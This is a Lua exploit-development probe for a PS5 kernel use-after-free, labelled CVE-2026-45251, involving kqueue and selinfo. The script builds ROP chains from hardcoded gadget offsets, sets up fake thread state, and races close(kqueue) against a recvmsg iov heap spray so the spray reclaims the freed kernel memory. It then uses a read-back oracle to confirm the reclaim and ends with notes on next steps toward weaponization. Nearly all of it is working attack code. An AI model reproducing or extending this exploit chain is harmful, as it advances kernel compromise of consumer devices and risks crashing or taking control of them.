-- CRASH_CLASS: RISKY (kernel panic = PS5 reboot if reclaim corrupts a live object)
-- PROBE 500n: VALID reclaim oracle for CVE-2026-45251.
--
-- ROOT CAUSE of the earlier "no reclaim" results:
--   500h/500k/500l/500m all issued syscall 29 thinking it was recvmsg.
--   On this kernel 27 = recvmsg and 29 = recvfrom, so the spray actually ran
--   recvfrom(sock, msghdr, len=0, ...) -> immediate 0-byte return. The kernel
--   iov array was NEVER allocated and the "spray children" never blocked
--   (500l/500m literally logged spray_running=0/8). There was no spray at all.
--
-- Why 500k/500l/500m were inconclusive:
--   * kqueue is NOT a dedicated UMA zone on FreeBSD 11. kqueue_alloc() does
--     malloc(sizeof(struct kqueue), M_KQUEUE, M_WAITOK|M_ZERO). Only knote_zone
--     is uma_zcreate'd. M_KQUEUE and M_IOV both live in the size-class malloc
--     zones (256B / 512B), so an iov spray CAN reach a freed kqueue slot.
--   * seltdclear() -> selfdfree() does NOT read si->si_mtx from freed memory.
--     It takes mtx_lock(sfp->sf_mtx), and sf_mtx lives in the LIVE selfd. The
--     only freed-memory access is TAILQ_REMOVE(&sfp->sf_si->si_tdlist, ...).
--     So an "all 0x100" crash oracle can never fire, no matter what reclaims.
--     "NO RECLAIM" from 500k is therefore unsupported.
--
-- This probe uses a READ-BACK oracle instead:
--   1. One child closes the kqueue AND THEN allocates the spray itself
--      (recvmsg with iovcnt N). Same thread -> same CPU -> the freed kq slot
--      is still in that CPU's UMA cache, so the iov malloc is likely to pop it.
--      The kernel blocks in recvmsg with the iov array resident.
--   2. The poller thread times out ~1s later. selfdfree() writes into the
--      freed selinfo, which now overlaps the kernel iov array:
--         [kq_sel+0] = 0        (or &second_selfd with two waiters)
--         [kq_sel+8] = kq_sel
--   3. Main sends bytes into the spray socket. If the slot was reclaimed, the
--      corrupted iovec forces copyout to a NULL/kernel base -> recvmsg returns
--      -1 (EFAULT) or a short count. If not reclaimed, it returns exactly the
--      byte count sent.
--
-- Interpretation:
--   ret == 0xFFFFFFFFFFFFFFFF  -> RECLAIM CONFIRMED (EFAULT from corrupted iov)
--   ret == 0..sent-1           -> RECLAIM CONFIRMED (short copy, len zeroed)
--   ret == sent                -> no reclaim on this CPU/size; try more iters
--
-- Two iterations: iovcnt=16 (256B bucket) then iovcnt=32 (512B bucket), in
-- case Sony's struct kqueue is bigger than the upstream 232B estimate.

print("=== PROBE 500n: SAME-CPU RECLAIM + READ-BACK ORACLE ===")
print("")
print("WARNING: if reclaim lands on a live kernel object instead of our iov,")
print("the kernel may panic and the PS5 will reboot.")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base via sys 593 (same as 500k)
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets (identical to 500k)
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi], rax

-- Fake TCB for child threads
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))
local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

-- SIG_IGN SIGSEGV/SIGBUS/SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

local function make_stack()
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    return sb, rsp
end

local function build_poller(gate_rd, pollfd_addr, marker_addr, timeout_ms)
    local sb, rsp = make_stack()
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)          -- set_tcb
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)            -- read gate
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(timeout_ms))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)          -- poll
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)                                       -- store rax
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)          -- thr exit
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- close(target_fd) then immediately recvmsg(sock_rd, msghdr) on the SAME thread.
-- Same CPU -> the just-freed kq slot is in this CPU's UMA cache -> iov malloc
-- is very likely to pop it.
local function build_closer_sprayer(gate_rd, target_fd, close_marker, sock_rd,
                                    msghdr_addr, ret_marker)
    local sb, rsp = make_stack()
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)          -- set_tcb
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)            -- read gate
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)            -- close(kq)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(close_marker))
    emit(g_mov_m_rax)                                       -- marker = 1
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(27)); emit(stub)           -- recvmsg (blocks) — 29 is recvfrom!
    emit(g_pop_rdi); emit(uint64(ret_marker))
    emit(g_mov_m_rax)                                       -- store retval
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)          -- thr exit
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local sc_kqueue = mk(362)

-- One race iteration. iovcnt = 16 -> 256B iov array, 32 -> 512B.
local function run_once(label, iovcnt)
    local iov_bytes = iovcnt * 16
    print("[" .. label .. "] iovcnt=" .. iovcnt ..
          " (" .. iov_bytes .. "B kernel iov)")

    -- iov array: every entry points at its own 1-byte slot, len = 1
    local iov_area = memory.alloc(iov_bytes + 16)
    local data_area = memory.alloc(iovcnt + 16)
    for i = 0, iovcnt - 1 do
        wq(N(iov_area) + i * 16, uint64(N(data_area) + i))
        wd(N(iov_area) + i * 16 + 8, 1)
        wd(N(iov_area) + i * 16 + 12, 0)
        wd(N(data_area) + i, 0x41 + (i % 26))
    end

    local mh = memory.alloc(0x30)
    for i = 0, 0x2C, 4 do wd(N(mh) + i, 0) end
    wq(N(mh) + 0x00, uint64(0))            -- msg_name
    wd(N(mh) + 0x08, 0)                    -- msg_namelen
    wq(N(mh) + 0x10, uint64(N(iov_area)))  -- msg_iov
    wd(N(mh) + 0x18, iovcnt)               -- msg_iovlen
    wq(N(mh) + 0x20, uint64(0))            -- msg_control
    wd(N(mh) + 0x28, 0)                    -- msg_controllen

    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue FAIL"); return "fail" end
    print("  kq_fd=" .. kq)

    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  gate FAIL"); return "fail"
    end

    -- Spray socketpair: closer blocks in recvmsg on sr, main sends on sw.
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local sr = rd(N(sv)) or 0xFFFF
    local sw = rd(N(sv) + 4) or 0xFFFF
    if sr == 0xFFFF or sw == 0xFFFF then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  socketpair FAIL"); return "fail"
    end

    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)

    local mA = memory.alloc(8); wd(N(mA), 0); wd(N(mA) + 4, 0xAA)
    local mClose = memory.alloc(8); wd(N(mClose), 0); wd(N(mClose) + 4, 0)
    local mRet = memory.alloc(8); wd(N(mRet), 0); wd(N(mRet) + 4, 0xBB)

    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA), 1000), uint64(0x38)) end)
    pcall(function()
        mk(455)(build_closer_sprayer(gB_r, kq, N(mClose), sr, N(mh), N(mRet)), uint64(0x38))
    end)

    -- poller enters kernel first
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 50000 do local _ = rd(N(mA)) end

    -- closer: close(kq) then recvmsg allocates the iov on the same CPU
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)
    for w = 1, 200000 do
        if rd(N(mClose)) == 1 then break end
    end
    -- give recvmsg time to allocate + block
    for d = 1, 300000 do local _ = rd(N(mA)) end
    if not alive() then return "died_after_close" end

    -- wait for the poller timeout -> seltdclear writes into freed selinfo
    for w = 1, 4000000 do
        if not alive() then return "died_seltdclear" end
        if rd(N(mA) + 4) ~= 0xAA then break end
    end
    if not alive() then return "died_after_timeout" end

    -- now release the spray: send iovcnt bytes into the peer
    pcall(function() mk(4)(uint64(sw), uint64(N(data_area)), uint64(iovcnt)) end)

    -- wait for the closer's recvmsg to return
    for w = 1, 2000000 do
        if not alive() then return "died_recv" end
        if rd(N(mRet) + 4) ~= 0xBB then break end
    end

    local rv = rq(uint64(N(mRet)))
    local rvh, rvl = 0, 0
    if type(rv) == "table" and rv.h then rvh, rvl = rv.h, rv.l else rvl = N(rv) end
    print("  recvmsg_ret=" .. string.format("0x%08X%08X", rvh, rvl))
    print("  poll_rv=" .. fmt(rq(uint64(N(mA)))))

    -- cleanup
    pcall(function() mk(6)(uint64(sr)) end)
    pcall(function() mk(6)(uint64(sw)) end)
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)

    local low = N(rvl)
    if low == 0xFFFFFFFF then return "EFAULT"
    elseif low < iovcnt then return "SHORT(" .. low .. "/" .. iovcnt .. ")"
    else return "clean(" .. low .. ")" end
end

local r256 = run_once("ITER 1/2 256B", 16)
print("  -> " .. tostring(r256))
print("")
if not alive() then
    print("Process died — see label above. If the console rebooted, reclaim is REAL")
    print("and seltdclear corrupted a live object instead of our iov.")
    print("=== PROBE 500n COMPLETE (partial) ===")
    return
end

local r512 = run_once("ITER 2/2 512B", 32)
print("  -> " .. tostring(r512))
print("")

print("========================================")
print("RESULTS: 256B=" .. tostring(r256) .. "  512B=" .. tostring(r512))
print("")
if r256 == "EFAULT" or r512 == "EFAULT"
   or (r256 and r256:sub(1,5) == "SHORT") or (r512 and r512:sub(1,5) == "SHORT") then
    print("INTERPRETATION: RECLAIM CONFIRMED — same-zone general malloc reuse.")
    print("The write is the bounded TAILQ_REMOVE: [kq_sel+0]=0, [kq_sel+8]=kq_sel.")
    print("This is NOT si_mtx control. Weaponization must target a victim 256/512B")
    print("general-zone object whose field at kq_sel+0/+8 is security-relevant.")
elseif r256 == "clean(16)" and r512 == "clean(32)" then
    print("INTERPRETATION: no reclaim observed in these two runs.")
    print("Not proof of a dedicated zone (kqueue is malloc M_KQUEUE on FreeBSD 11).")
    print("Next: more iterations, or force UMA cache flush on the closer CPU.")
else
    print("INTERPRETATION: mixed / unexpected — inspect per-iteration output.")
end
print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 500n COMPLETE ===")
